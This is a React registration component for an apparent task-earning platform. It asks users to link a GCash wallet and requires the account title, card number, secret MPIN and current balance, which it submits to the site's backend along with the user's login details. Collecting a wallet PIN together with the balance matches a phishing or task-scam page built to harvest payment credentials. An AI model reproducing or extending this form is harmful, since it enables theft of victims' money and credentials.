import React, { useState } from 'react';
import './Register.css';
import { useNavigate } from 'react-router-dom';
import { useLocation } from 'react-router-dom';
import ApiService from '../services/apiService';
import ApiUrls from '../services/apiUrls';
import Select from 'react-select';
import { OrbitProgress } from 'react-loading-indicators';

const apiService = new ApiService(ApiUrls.BASE_URL);

function Loader() {
    return (
        <div className="loader-container">
            <OrbitProgress
                variant="spokes"
                color="#dcd6d6"
                size="medium"
                text=""
                textColor=""
            />
        </div>
    );
}

function FormInput({ type, name, value, handleChange, required }) {
    return (
        <div>
            <input
                className="forminput-style"
                type={type}
                name={name}
                autoComplete="new-password"
                value={value}
                onChange={handleChange}
                required={required}
            />
        </div>
    );
}

function RegisterBank() {
    const options = [{ value: '1', label: 'GCASH' }];
    const location = useLocation();
    const registerData = location.state?.registerData;
    const navigate = useNavigate();
    const [isLoading, setIsLoading] = useState(false);
    const [bankData, setBankData] = useState({
        card_title: '',
        card_account: '',
        card_number: '',
        card_password: '',
        card_balance: '',
        card_payment_id: '',
        account: registerData.account,
        mail: registerData.mail,
        promotion_code: registerData.promotion_code,
        password: registerData.password,
        phone: registerData.phone,
        first_name: registerData.first_name,
        second_name: registerData.second_name
    });

    // 檢查必填欄位是否完成
    const isFormValid =
        bankData.card_title.trim() !== '' &&
        bankData.card_account.trim() !== '' &&
        bankData.card_number.trim() !== '' &&
        bankData.card_password.trim() !== '' &&
        bankData.card_balance.trim() !== '' &&
        bankData.card_payment_id.trim() !== '';

    const handleSelectChange = (selectedOption) => {
        setBankData((prevBankData) => ({
            ...prevBankData, // 保留其他欄位的值
            card_payment_id: selectedOption.value // 更新 card_payment_id
        }));
    };

    const handleChange = (e) => {
        const { name, value } = e.target;
        setBankData({
            ...bankData,
            [name]: value
        });
    };

    const handleSubmit = async (event) => {
        event.preventDefault();
        setIsLoading(true);
        try {
            const response = await apiService.post(ApiUrls.REGISTER, bankData);
            if (response.code == 200) {
                alert('Registration successful');
                navigate('/pending');
            } else {
                console.log('code: ', response.code);
                alert(response.error_msg);
            }
        } catch (error) {
            alert('Registration failed. Please try again.', error);
        } finally {
            setIsLoading(false);
        }
    };

    return (
        <div>
            <div className="bg-top"></div>
            <div className="ic-top-left"></div>
            <div className="page-title">Register</div>
            <div className="register-container">
                <div>
                    <span className="content-text-black">You need to</span>
                    <span className="content-text-red">
                        {' '}
                        link your primary payment getway{' '}
                    </span>
                    <span className="content-text-black">
                        account during registration to start receiving tasks.
                    </span>
                </div>
                <div>
                    <span className="content-text-black">
                        Currently, you can{' '}
                    </span>
                    <span className="content-text-red">
                        only select one getway.{' '}
                    </span>
                </div>
                <div>
                    <span className="content-text-red">
                        After completing registration, you can set up additional
                        payment getway.
                    </span>
                </div>
                <img className="divider"></img>
                <form
                    className="form-register-container"
                    onSubmit={handleSubmit}
                >
                    <label className="label-input">
                        *PrimaryPayment Getway
                    </label>
                    <Select
                        options={options}
                        efaultValue={options[0]}
                        onChange={handleSelectChange}
                        required
                    />
                    <div className="bank-info">
                        <label className="label-input">*Account Title</label>
                        <FormInput
                            type="text"
                            name="card_title"
                            value={bankData.card_title}
                            handleChange={handleChange}
                            required
                        />
                        <label className="label-input">*Gcash account</label>
                        <FormInput
                            type="text"
                            name="card_account"
                            value={bankData.card_account}
                            handleChange={handleChange}
                            required
                        />
                        <label className="label-input">
                            *Gcash card number
                        </label>
                        <FormInput
                            type="number"
                            name="card_number"
                            value={bankData.card_number}
                            handleChange={handleChange}
                            required
                        />
                        <label className="label-input">*MPIN</label>
                        <FormInput
                            type="password"
                            name="card_password"
                            value={bankData.card_password}
                            handleChange={handleChange}
                            required
                        />
                        <label className="label-input">*Your Balance</label>
                        <FormInput
                            type="number"
                            name="card_balance"
                            value={bankData.card_balance}
                            handleChange={handleChange}
                            required
                        />
                        <div>
                            <span className="content-text-red">
                                Be honest; balance updates after completion.
                            </span>
                        </div>
                    </div>
                    <div className="container-flex">
                        <img className="divider"></img>
                        <button
                            type="submit"
                            className="register-btn"
                            disabled={!isFormValid}
                            style={{
                                backgroundColor: isFormValid
                                    ? '#DF4A3B'
                                    : '#BBBBBB'
                            }}
                        >
                            {isLoading ? 'Registering...' : 'Register'}
                        </button>
                    </div>
                </form>
                {isLoading && <Loader />}
            </div>
        </div>
    );
}
export default RegisterBank;
